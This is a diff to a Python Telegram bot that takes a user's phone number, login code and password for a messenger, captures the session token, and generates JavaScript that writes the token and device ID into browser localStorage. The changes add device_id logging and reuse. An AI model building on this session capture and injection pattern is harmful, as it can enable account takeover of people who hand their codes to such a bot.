@@ -87,7 +87,7 @@ def build_desktop_json(token, device_id, session_id, password, user_id, phone):
     }
 
 def generate_web_js(device_id, token, viewer_id):
-    auth_str = json.dumps({"token": token, "viewerId": viewer_id}, ensure_ascii=False)
+    auth_str = json.dumps({"token": token, "viewerId": viewer_id}, ensure_ascii=False, separators=(',', ':'))
     return f"""sessionStorage.clear();
 localStorage.clear();
 localStorage.setItem('__oneme_device_id', '{device_id}');
@@ -143,7 +143,10 @@ async def phone_handler(message: types.Message, state: FSMContext):
                 pending[uid]["token"] = client.token
                 pending[uid]["user_id"] = client.my_id
                 pending[uid]["status"] = "done"
-                logging.info(f"auth_task: статус done для uid={uid}")
+                # Логируем device_id
+                logging.info(f"client.device_id: {getattr(client, 'device_id', 'НЕТ')}")
+                logging.info(f"client._device_id: {getattr(client, '_device_id', 'НЕТ')}")
+                logging.info(f"client.session.device_id: {getattr(getattr(client, 'session', None), 'device_id', 'НЕТ')}")
         except Exception as e:
             error = str(e).lower()
             logging.error(f"auth_task: исключение для uid={uid}: {e}")
@@ -221,6 +224,14 @@ async def code_handler(message: types.Message, state: FSMContext):
             password = gen_password()
             session_id = int(time.time() * 1000)
             device_id = gen_device_id()
+
+            # Сохраняем device_id из клиента, если есть
+            client = pending[uid].get("client")
+            if client:
+                client_device_id = getattr(client, 'device_id', None) or getattr(getattr(client, 'session', None), 'device_id', None)
+                if client_device_id:
+                    device_id = client_device_id.replace('-', '')[:16]
+                    logging.info(f"Используем device_id из клиента: {device_id}")
 
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
             js = generate_web_js(device_id, token, viewer_id)
@@ -310,6 +321,13 @@ async def password_handler(message: types.Message, state: FSMContext):
         password = gen_password()
         session_id = int(time.time() * 1000)
         device_id = gen_device_id()
+
+        # Сохраняем device_id из клиента, если есть
+        if client:
+            client_device_id = getattr(client, 'device_id', None) or getattr(getattr(client, 'session', None), 'device_id', None)
+            if client_device_id:
+                device_id = client_device_id.replace('-', '')[:16]
+                logging.info(f"Используем device_id из клиента: {device_id}")
 
         js = generate_web_js(device_id, token, viewer_id)
 
